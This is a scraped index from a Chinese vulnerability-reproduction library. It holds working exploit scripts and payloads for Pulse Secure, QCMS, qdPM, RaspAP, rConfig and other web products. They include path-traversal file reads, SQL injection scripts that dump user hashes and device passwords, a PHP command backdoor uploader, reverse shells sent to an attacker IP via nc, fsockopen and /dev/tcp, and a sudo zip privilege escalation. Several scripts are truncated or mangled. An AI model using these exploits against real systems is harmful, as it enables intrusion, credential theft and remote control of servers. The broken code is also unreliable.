VPN 任意文件读取/（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取.html":{"url":"Web安全/Pulse Secure/（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取/（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取.html","title":"（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取","keywords":"","body":"（CVE-2019-11510）Pulse Secure SSL VPN 任意文件读取 一、漏洞简介 Pulse Secure Pulse Connect Secure（又名 PCS，前称 Juniper Junos Pulse）是美国 Pulse Secure 公司的一套 SSL VPN 解决方案。爆发的 CVE-2019-11510 该漏洞是由于所引入的一项通过浏览器访问其他端口的新功能缺乏安全限制所导致的，任意攻击者都可在未经身份验证的情况下利用该漏洞，读取系统敏感文件，获取 session、明文密码等敏感信息，从而非法入侵并操控 VPN，从而进一步威胁企业内网服务。 二、漏洞影响 Pulse Secure PCS 9.0RX Pulse Secure PCS 8.3RX Pulse Secure PCS 8.2RX Pulse Secure PCS 8.1R15.1 三、复现过程 poc Pcs_Ssl_Vpn_CVE_2019_11510@Coco413.py PulseSecureSSLVPN任意文件读取/media/rId25.png) # -*- coding:utf-8 -*- # !/usr/bin/env python import sys import urlparse import requests import warnings import traceback reload(sys) sys.setdefaultencoding('utf-8') requests.packages.urllib3.disable_warnings() warnings.filterwarnings(\"ignore\") def CVE_2019_11510(base_url): try: payloads, keywords = \"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/\", \"root:x\" r = requests.get(base_url + payloads, verify=False) r.close() if keywords in r.text: print \"[✓] Found CVE-2019-11510 Vuln address(curl --path-as-is -s -k ):\\n{}\\n{}\".format( base_url + payloads, r.content) else: print \"[x] Not Found Vuln!\" except requests.exceptions.ConnectionError: pass except requests.ReadTimeout: pass except: traceback.print_exc() if __name__ == '__main__': if len(sys.argv) == 1: print '[+] Tip: python Pcs_Ssl_Vpn_CVE_2019_11510@Coco413.py ' sys.exit(0) url = sys.argv[1] CVE_2019_11510(urlparse.urlparse(url).scheme + \"://\" + urlparse.urlparse(url).hostname) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:14 "},"Web安全/Pyspider/pyspider未授权访问/pyspider未授权访问.html":{"url":"Web安全/Pyspider/pyspider未授权访问/pyspider未授权访问.html","title":"pyspider未授权访问","keywords":"","body":"pyspider未授权访问 一、漏洞简介 pyspider未授权访问 二、影响范围 三、复现过程 https://github.com/ianxtianxt/Pyspider-web Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:15 "},"Web安全/QCMS/QCMS 3.0 sql注入漏洞/QCMS 3.0 sql注入漏洞.html":{"url":"Web安全/QCMS/QCMS 3.0 sql注入漏洞/QCMS 3.0 sql注入漏洞.html","title":"QCMS 3.0 sql注入漏洞","keywords":"","body":"QCMS 3.0 sql注入漏洞 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 在后台下载管理处 构造payload http://www.0-sec.org/backend/down.html?title=1';select if(ascii(substr((select database()), 1, 1))-113, 1, sleep(5));%23 这里直接附上简单脚本 # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests def getCookie(): url = 'http://127.0.0.1/admin.php' data = { 'username':'admin', 'password':'admin' } session = requests.session() res = session.post(url, data) return requests.utils.dict_from_cookiejar(res.cookies) def getDatabase(url, arr, cookies): str = '' requests.session() for i in range(1, 11): for j in arr: data = url + '?title=1\\';select if(ascii(substr((select database()), %s, 1))-%s, 1, sleep(5));%%23' % (i, ord(j)) # print(data) res = requests.get(url=data, cookies=cookies) # print(res.elapsed.total_seconds()) if(res.elapsed.total_seconds() > 5): str += j print(str) break print('database=' + str) if __name__ == '__main__': url = 'http://127.0.0.1/backend/down.html' arr = [] for i in range(48, 123): arr.append(chr(i)) cookies = getCookie() print(cookies) getDatabase(url, arr, cookies) 参考链接 https://xz.aliyun.com/t/7269 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:15 "},"Web安全/QCMS/QCMS 3.0 任意文件上传/QCMS 3.0 任意文件上传.html":{"url":"Web安全/QCMS/QCMS 3.0 任意文件上传/QCMS 3.0 任意文件上传.html","title":"QCMS 3.0 任意文件上传","keywords":"","body":"QCMS 3.0 任意文件上传 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 漏洞产生点在系统设置上传logo处 构造一个test.php文件，内容为`，点击上传 可以看到，上传后给出了路径 访问文件，发现上传成功 需要注意的是，每次上传后会将内容的hash保存到数据库中，如果再次上传时会检查数据库内容是否有重复，有则拒绝上传，因此如果第一遍上传有误，需要对内容进行简单的修改才能上传。 参考链接 https://xz.aliyun.com/t/7269 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:16 "},"Web安全/QCMS/QCMS 3.0 任意文件读取/QCMS 3.0 任意文件读取.html":{"url":"Web安全/QCMS/QCMS 3.0 任意文件读取/QCMS 3.0 任意文件读取.html","title":"QCMS 3.0 任意文件读取","keywords":"","body":"QCMS 3.0 任意文件读取 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 用seay扫了一下后发现的漏洞 漏洞在后台模板代码预览处，构造payload例如 http://www.0-sec.org/backend/template/tempview/Li4vLi4vLi4vQ29udHJvbGxlci9hZG1pbi5waHA=.html 即可读取Controller文件下admin.php文件源码 跟源码对比下，确实是读到了 参考链接 https://xz.aliyun.com/t/7269 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:17 "},"Web安全/QCMS/QCMS 3.0 留言板xss/QCMS 3.0 留言板xss.html":{"url":"Web安全/QCMS/QCMS 3.0 留言板xss/QCMS 3.0 留言板xss.html","title":"QCMS 3.0 留言板xss","keywords":"","body":"QCMS 3.0 留言板xss 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 按照如图所示构造payload 提交之后无需审核，直接先弹个窗。。 登录后台再弹一个。。 查看数据库，没有过滤直接插入 参考链接 https://xz.aliyun.com/t/7269 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:20 "},"Web安全/QdPM/（CVE-2020-7246）QdPM 9.1 远程代码执行漏洞/（CVE-2020-7246）QdPM 9.1 远程代码执行漏洞.html":{"url":"Web安全/QdPM/（CVE-2020-7246）QdPM 9.1 远程代码执行漏洞/（CVE-2020-7246）QdPM 9.1 远程代码执行漏洞.html","title":"（CVE-2020-7246）QdPM 9.1 远程代码执行漏洞","keywords":"","body":"（CVE-2020-7246）QdPM \\ 一、漏洞简介 二、漏洞影响 三、复现过程 python CVE-2020-7246.py -url https://www.0-sec.org/ -u 用户名 -p密码 # Exploit Title: qdPM 9.1 - Remote Code Execution # Google Dork: intitle:qdPM 9.1. Copyright © 2020 qdpm.net # Date: 2020-01-22 # Exploit Author: Rishal Dwivedi (Loginsoft) # Vendor Homepage: http://qdpm.net/ # Software Link: http://qdpm.net/download-qdpm-free-project-management # Version: \"; $cmd = ($_REQUEST[\\'cmd\\']); system($cmd); echo \"\"; die; }?>' , 'application/octet-stream'), } upload_req = session_requests.post(HOSTNAME + 'index.php/myAccount/update', files=request_3) def main(HOSTNAME, EMAIL, PASSWORD): result = session_requests.get(HOSTNAME + '/index.php/login') login_tree = html.fromstring(result.text) authenticity_token = list(set(login_tree.xpath(\"//input[@name='login[_csrf_token]'][email protected]/* */\" )))[0] payload = {'login[email]': EMAIL, 'login[password]': PASSWORD, 'login[_csrf_token]': authenticity_token} result = session_requests.post(HOSTNAME + '/index.php/login', data=payload, headers=dict(referer=HOSTNAME + '/index.php/login')) account_page = session_requests.get(HOSTNAME + 'index.php/myAccount' ) account_tree = html.fromstring(account_page.content) userid = account_tree.xpath(\"//input[@name='users[id]'][email protected]/* */\") username = account_tree.xpath(\"//input[@name='users[name]'][email protected]/* */\") csrftoken_ = account_tree.xpath(\"//input[@name='users[_csrf_token]'][email protected]/* */\") req(userid, username, csrftoken_, EMAIL, HOSTNAME) get_file = session_requests.get(HOSTNAME + 'index.php/myAccount') final_tree = html.fromstring(get_file.content) backdoor = final_tree.xpath(\"//input[@name='users[photo_preview]'][email protected]/* */\") print 'Backdoor uploaded at - > ' + HOSTNAME + '/uploads/users/' + backdoor[-1] + '?cmd=whoami' if __name__ == '__main__': parser = ArgumentParser(description='qdmp - Path traversal + RCE Exploit' ) parser.add_argument('-url', '--host', dest='hostname', help='Project URL') parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)') parser.add_argument('-p', '--password', dest='password', help='User password') args = parser.parse_args() main(args.hostname, args.email, args.password) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:21 "},"Web安全/R&D Visions CMS/R&D Visions CMS  SQL Injection/R&D Visions CMS  SQL Injection.html":{"url":"Web安全/R&D Visions CMS/R&D Visions CMS  SQL Injection/R&D Visions CMS  SQL Injection.html","title":"R D Visions CMS SQL Injection","keywords":"","body":"R&D Visions CMS SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 Google Dork: intext:\"Website by R&D Visions\" inurl:.php?id= intext:\"CMS System by R&D Visions\" Demo: https://www.0-sec.org/home.php?newid=53[SQLi] Injection: https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log-- Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:22 "},"Web安全/RabbitMQ/RabbitMQ Web管理csrf漏洞/RabbitMQ Web管理csrf漏洞.html":{"url":"Web安全/RabbitMQ/RabbitMQ Web管理csrf漏洞/RabbitMQ Web管理csrf漏洞.html","title":"RabbitMQ Web管理csrf漏洞","keywords":"","body":"RabbitMQ Web管理csrf漏洞 一、漏洞简介 二、漏洞影响 RabbitMQ Web Management \\ 三、复现过程 Add RabbitMQ Admin window.onload = rabbit.submit() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:22 "},"Web安全/RaspAP/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞.html":{"url":"Web安全/RaspAP/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞/（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞.html","title":"（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞","keywords":"","body":"（CVE-2020-24572）RaspAP 2.5 远程命令执行漏洞 一、漏洞简介 在RaspAP 2.5的include/webconsole.php中发现了一个问题。借助经过身份验证的访问，攻击者可以使用配置错误（并且实际上不受限制）的Web控制台攻击运行该软件的底层OS（Raspberry Pi），并在系统上执行命令（包括用于上传文件和执行代码的命令）。 二、漏洞影响 RaspAP 2.5 三、复现过程 poc CVE-2020-24572.py RaspAP2.5远程命令执行漏洞/media/rId25.png)RaspAP2.5远程命令执行漏洞/media/rId26.png) #/usr/bin/python3 ##################################################### ############## deadb0x.io ############## ##################################################### ### Proof of Concept for CVE-2020-24572 ### ### (Authenticated) Remote Code Execution ### ### via Webconsole.php in ### ### RaspAP v2.5 ### ### github.com/billz/raspap-webgui ### ### github.com/nickola/web-console ### ##################################################### ### Written by: lunchb0x - Disc. Date: 08/24/2020 ### ##################################################### ### deadb0x.io/lunchb0x/CVE-2020-24572 ### ### github.com/lb0x/CVE-2020-24572 ### ##################################################### import os import sys import requests from termcolor import colored if len(sys.argv) != 6: print(\"---------------------------------------------------------------------------------------\") print(\"USAGE: rasp_pwn.py [target_ip] [port] [attacker_ip] [attacker_port] [RaspAP_admin_pass]\") print(\"---------------------------------------------------------------------------------------\") exit(1) target = sys.argv[1] port = sys.argv[2] listener_ip = sys.argv[3] listener_port = sys.argv[4] raspap_user = \"admin\" raspap_pass = sys.argv[5] session = requests.Session() session.auth = (raspap_user, raspap_pass) json_req_1 = { \"jsonrpc\":\"2.0\", \"method\":\"run\", \"params\":[\"NO_LOGIN\", {\"user\":\"\",\"hostname\":\"\",\"path\":\"\"}, \"echo 'touch \\/tmp\\/f;rm \\/tmp\\/f;mkfifo \\/tmp\\/f;cat \\/tmp\\/f|\\/bin\\/bash -i 2>&1|nc %s %d >\\/tmp\\/f' >> \\/etc\\/raspap\\/lighttpd\\/configport.sh\"%(listener_ip, listener_port) ], \"id\":6 } json_req_2 = { \"jsonrpc\":\"2.0\", \"method\":\"run\", \"params\":[\"NO_LOGIN\", {\"user\":\"\",\"hostname\":\"\",\"path\":\"\"}, \"sudo /etc/raspap/lighttpd/configport.sh\" ], \"id\":6 } r = session.post(\"http://%s:%s/includes/webconsole.php\"%(target,port), json=json_req_1) print(colored(\"[!]\", 'green') + \" Reverse shell injected\") print(colored(\"[!]\", 'yellow') + \" Sending activation request - Make sure your listener is running . . .\") os.system(\"stty -echo\") input(colored(\"[>>>]\", 'green')+\" Press ENTER to continue . . .\") os.system(\"stty echo\") print(colored(\"\\n[!]\", 'green') + \" You should be root :)\") r = session.post(\"http://%s:%s/includes/webconsole.php\"%(target,port), json=json_req_2) print(colored(\"[*]\", 'green') + \" Done.\") print(colored(\"----------------\", 'yellow')) print(colored(\"[] deadb0x.io\", 'yellow')) print(colored(\"----------------\", 'yellow')) 参考链接 https://deadb0x.io/lunchb0x/cve-2020-24572/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:23 "},"Web安全/rConfig/（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行/（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行.html":{"url":"Web安全/rConfig/（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行/（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行.html","title":"（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行","keywords":"","body":"（CVE-2019-16662）（CVE-2019-16663）rConfig v3.9.2 远程命令执行 一、漏洞简介 我在两个文件中分别发现了两个远程代码执行漏洞。第一个是ajaxServerSettingsChk.php，攻击者可以通过rootUname参数发送精心构造的一个GET请求，触发未授权RCE漏洞。rootUname参数在源文件第2行中定义，随后会在第13行传递给exec函数，攻击者可以构造参数接收内容实现让操作系统执行恶意命令。这个漏洞很容易利用和发现,后面的篇幅中我将介绍如何发现并利用这个漏洞。 第二个漏洞是在search.crud.php发现的，这文件需要通过身份验证才能触发远程代码执行漏洞。这个漏洞可以通过构造一个包含有两个参数的GET请求触发，其中searchTerm参数可以包含任意值，但该参数必须存在，才能执行到第63行的exec函数。 二、漏洞影响 rConfig v3.9.2 三、复现过程 https://www.0-sec.org/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php -r '$sock=fsockopen(\"1.2.3.4\",1234);exec(\"/bin/sh -i &3 2>&3\");'` (CVE-2019-16663)rConfigv3.9.2远程命令执行/media/rId24.png) pyton脚本一 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16662 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 4: print \"[+] Usage : ./exploit.py target ip port\" exit() target = sys.argv[1] ip = sys.argv[2] port = sys.argv[3] payload = quote(''';php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &3 2>&3\");'#'''.format(ip, port)) install_path = target + \"/install\" req = requests.get(install_path, verify=False) if req.status_code == 404: print \"[-] Installation directory not found!\" print \"[-] Exploitation failed !\" exit() elif req.status_code == 200: print \"[+] Installation directory found!\" url_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload print \"[+] Triggering the payload\" print \"[+] Check your listener !\" requests.get(url_to_send, verify=False) (CVE-2019-16663)rConfigv3.9.2远程命令执行/media/rId25.png) python脚本二 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16663 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 6: print \"[+] Usage : ./exploit.py target username password ip port\" exit() target = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] request = requests.session() login_info = { \"user\": username, \"pass\": password, \"sublogin\": 1 } login_request = request.post( target+\"/lib/crud/userprocess.php\", login_info, verify=False, allow_redirects=True ) dashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False) if dashboard_request.status_code == 200: print \"[+] LoggedIn successfully\" payload = '''\"\"&&php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &3 2>&3\");'#'''.format(ip, port) encoded_request = target+\"/lib/crud/search.crud.php?searchTerm=anything&catCommand={0}\".format(quote(payload)) print \"[+] triggering the payload\" print \"[+] Check your listener !\" exploit_req = request.get(encoded_request) elif dashboard_request.status_code == 302: print \"[-] Wrong credentials !\" exit() (CVE-2019-16663)rConfigv3.9.2远程命令执行/media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:29 "},"Web安全/rConfig/（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞/（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞.html":{"url":"Web安全/rConfig/（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞/（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞.html","title":"（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞","keywords":"","body":"（CVE-2019-19509）rConfig v3.9.3 后台远程命令执行漏洞 一、漏洞简介 rConfig是一款开源的网络配置管理实用程序。 rConfig 3.9.3版本中存在安全漏洞，该漏洞源于程序没有进行过滤就直接将'path'参数传输到'exec'函数。远程攻击者可通过向ajaxArchiveFiles.php文件发送GET请求利用该漏洞执行系统命令。 二、漏洞影响 rConfig v3.9.3 三、复现过程 python3 CVE-2019-19509.py https://192.168.43.34 admin root 192.168.43.245 8081 # rconfig - CVE-2019-19509 - Web authenticated RCE # [+] Logged in successfully, triggering the payload... # [+] Check your listener ! # ... # $ nc -nvlp 8081 # listening on [any] 8081 ... # connect to [192.168.43.245] from (UNKNOWN) [192.168.43.34] 34458 # bash: no job control in this shell # bash-4.2$ id # id # uid=48(apache) gid=48(apache) groups=48(apache) # bash-4.2$ CVE-2019-19509.py #!/usr/bin/python3 # Exploit Title: rConfig & /dev/tcp/{0}/{1} 0>&1`'''.format(ip, port) request = requests.session() login_info = { \"user\": username, \"pass\": password, \"sublogin\": 1 } login_request = request.post( target+\"/lib/crud/userprocess.php\", login_info, verify=False, allow_redirects=True ) dashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False) if dashboard_request.status_code == 200: print (\"[+] Logged in successfully, triggering the payload...\") encoded_request = target+\"/lib/ajaxHandlers/ajaxArchiveFiles.php?path={0}&ext=random\".format(urllib.parse.quote(payload)) print (\"[+] Check your listener !\") exploit_req = request.get(encoded_request) elif dashboard_request.status_code == 302: print (\"[-] Wrong credentials !\") exit() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:31 "},"Web安全/rConfig/（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞/（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞.html":{"url":"Web安全/rConfig/（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞/（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞.html","title":"（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞","keywords":"","body":"（CVE-2019-19585）rConfig v3.9.3 本地权限提升漏洞 一、漏洞简介 rConfig是一款开源的网络配置管理实用程序。 rConfig 3.9.3版本中存在安全漏洞。攻击者可利用该漏洞绕过本地安全限制。 二、漏洞影响 rConfig v3.9.3 三、复现过程 这个漏洞需要CVE-2019-19509 + CVE-2019-19585相配合才能深入利用 poc CVE-2019-19585.py # Exploit Title: rConfig & /dev/tcp/{0}/{1} 0>&1`'''.format(ip, port) # root RCE payload, including CVE-2019-19585 payload = ''' `touch /tmp/CVE-2019-19585.txt;sudo zip -q /tmp/LPE.zip /tmp/CVE-2019-19585.txt -T -TT '/bin/sh -i>& /dev/tcp/{0}/{1} 0>&1 #'` '''.format(ip, port) request = requests.session() login_info = { \"user\": username, \"pass\": password, \"sublogin\": 1 } login_request = request.post( target+\"/lib/crud/userprocess.php\", login_info, verify=False, allow_redirects=True ) dashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False) if dashboard_request.status_code == 200: print (\"[+] Logged in successfully, triggering the payload...\") encoded_request = target+\"/lib/ajaxHandlers/ajaxArchiveFiles.php?path={0}&ext=random\".format(urllib.parse.quote(payload)) print (\"[+] Check your listener !\") exploit_req = request.get(encoded_request) elif dashboard_request.status_code == 302: print (\"[-] Wrong credentials !\") exit() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:31 "},"Web安全/rConfig/（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞/（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞.html":{"url":"Web安全/rConfig/（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞/（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞.html","title":"（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞","keywords":"","body":"（CVE-2020-10220）rConfig v3.9.4 sql注入漏洞 一、漏洞简介 rConfig是一款开源的网络配置管理实用程序。 rConfig 3.9.4及之前版本中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 二、漏洞影响 rConfig v3.9.4 三、复现过程 poc CVE-2020-10220.py # Exploit Title: rConfig 3.9 - SQL injection # Date: 2020-03-03 # CVE-2020-10220 # Exploit Author: vikingfr # Exploit link : https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py # Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig) # Software Link : https://www.rconfig.com/downloads/rconfig-3.9.4.zip # Install scripts : # https://www.rconfig.com/downloads/scripts/install_rConfig.sh # https://www.rconfig.com/downloads/scripts/centos7_install.sh # https://www.rconfig.com/downloads/scripts/centos6_install.sh # Version: tested v3.9.4 # Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24 # # Notes : If you want to reproduce in your lab environment follow those links : # http://help.rconfig.com/gettingstarted/installation # then # http://help.rconfig.com/gettingstarted/postinstall # # $ python3 rconfig_sqli.py https://1.1.1.1 # rconfig 3.9 - SQL Injection PoC # [+] Triggering the payloads on https://1.1.1.1/commands.inc.php # [+] Extracting the current DB name : # rconfig2 # [+] Extracting 10 first users : # admin:1:63a9f0ea7bb98050796b649e85481845 # Maybe no more information ? # Maybe no more information ? # [snip] # [+] Extracting 10 first devices : # 127-0-0-1:127.0.0.1::ocdvulnpass: # deviceTestName:1.1.1.1:myusertest:mysecret:myenablesecret # Maybe no more information ? # Maybe no more information ? # [snip] # Done #!/usr/bin/python3 import requests import sys import urllib.parse from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) print (\"rconfig 3.9 - SQL Injection PoC\") if len(sys.argv) != 2: print (\"[+] Usage : ./rconfig_exploit.py https://target\") exit() vuln_page=\"/commands.inc.php\" vuln_parameters=\"?searchOption=contains&searchField=vuln&search=search&searchColumn=command\" given_target = sys.argv[1] target = given_target target += vuln_page target += vuln_parameters request = requests.session() dashboard_request = request.get(target+vuln_page, allow_redirects=False, verify=False) def extractDBinfos(myTarget=None,myPayload=None): \"\"\" Extract information from database Args: - target+payload (String) Returns: - payload result (String) \"\"\" result = \"\" encoded_request = myTarget+myPayload exploit_req = request.get(encoded_request) if '[PWN]' in str(exploit_req.content): result = str(exploit_req.content).split('[PWN]')[1] else: result=\"Maybe no more information ?\" return result if dashboard_request.status_code != 404: print (\"[+] Triggering the payloads on \"+given_target+vuln_page) # get the db name print (\"[+] Extracting the current DB name :\") db_payload = \"%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)%20limit%200,1),NULL--\" db_name = extractDBinfos(target,db_payload) print (db_name) # DB extract users print (\"[+] Extracting 10 first users :\") for i in range (0, 10): user1_payload=\"%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,username,0x3A,id,0x3A,password,0x5B50574E5D3C42523E)%20FROM%20\"+db_name+\".users+limit+\"+str(i)+\",\"+str(i+1)+\"),NULL--\" user_h = extractDBinfos(target,user1_payload) #print (\"[+] Dump device \"+str(i)) print (user_h) # DB extract devices information print (\"[+] Extracting 10 first devices :\") for i in range (0, 10): device_payload=\"%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,deviceName,0x3A,deviceIpAddr,0x3A,deviceUsername,0x3A,devicePassword,0x3A,deviceEnablePassword,0x5B50574E5D3C42523E)%20FROM%20\"+db_name+\".nodes+limit+\"+str(i)+\",\"+str(i+1)+\"),NULL--\" device_h = extractDBinfos(target,device_payload) #print (\"[+] Dump device \"+str(i)) print (device_h) print (\"Done\") else: print (\"[-] Please verify the URI\") exit() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:02:32 "},"Web安全/rConfig/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞.html":{"url":"Web安全/rConfig/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞/rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞.html","title":"rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞","keywords":"","body":"rConfig ajaxArchiveFiles.php 后台远程命令执行漏洞 漏洞描述 rConfig ajaxArchiveFiles.php文件中由于对path参数和ext参数进行命令拼接，导致攻击者可以远程命令执行获取服务器权限 漏洞影响 rConfig FOFA app=\"rConfig\" 漏洞复现 存在漏洞的文件为 /home/rconfig/www/lib/ajaxHandlers/ajaxArchiveFiles.php logged_in) { echo 'Don\\'t bother trying to hack me!!!!! This hack attempt has been logged'; $log->Warn(\"Security Issue: Some tried to access this file directly from IP: \" . $_SERVER['REMOTE_ADDR'] . \" & Username: \" . $session->username . \" (File: \" . $_SERVER['PHP_SELF'] . \")\"); // need to add authentication to this script header(\"Location: \" . $config_basedir . \"login.php\"); } else { //archive logs files $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); foreach (glob($fullpath) as $v) { unlink($v); } $fileCount = count(glob($mainPath . $ext)); if ($fileCount > 0) { $response = json_encode(array( 'failure' => true )); } else { $response = json_encode(array( 'success' => true )); } echo $response; } // end session check 关键代码如下 $mainPath = $_GET['path']; $archiveMainPath = $mainPath . \"archive/\"; $ext = \"*.\" . $_GET['ext']; $fullpath = $mainPath . $ext; // create and archive dir if not already created if (!is_dir($archiveMainPath)) { mkdir(\"$archiveMainPath\"); } $today = date(\"Ymd\"); $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; exec($commandString); $mainPath参数和$ext参数 用户可控 $commandString = \"sudo -u apache zip -r -j \" . $archiveMainPath . \"filename\" . $today . \".zip \" . $mainPath . $ext; 没有使用过滤直接拼接命令，导致命令执行，并因为sudo而root权限执行，由于是后台漏洞所以需要登录，配合任意用户创建可以RCE 请求包为 GET /lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;ls%3E../../pq.txt HTTP/1.1 Host: Cookie: cookname=pqtest; cookid=a13be657db5e18e453c66c564467b0f2; PHPSESSID=lr7j5r2beat1eprpklrhiorq71 Cache-Control: max-age=0 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Length: 2 再请求 http://xxx.xxx.xxx.xxx/pq.txt 验证漏洞 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning from requests_toolbelt.multipart.encoder import MultipartEncoder def POC_1(target_url): vuln_url = target_url + \"/lib/crud/userprocess.php\" referer = target_url + \"useradmin.php\" ran_number = random.randint(1, 999) origin = target_url multipart_data = MultipartEncoder( fields={ 'username': 'pqtest{}'.format(ran_number), 'password': 'PQtest@{}'.format(ran_number), 'passconf': 'PQtest@{}'.format(ran_number), 'email': 'PQtest{}@test.com'.format(ran_number), 'ulevelid': '9', 'add': 'add', 'editid': '' } ) headers = {'Content-Type': multipart_data.content_type, \"Upgrade-Insecure-Requests\": \"1\", \"Referer\": referer, 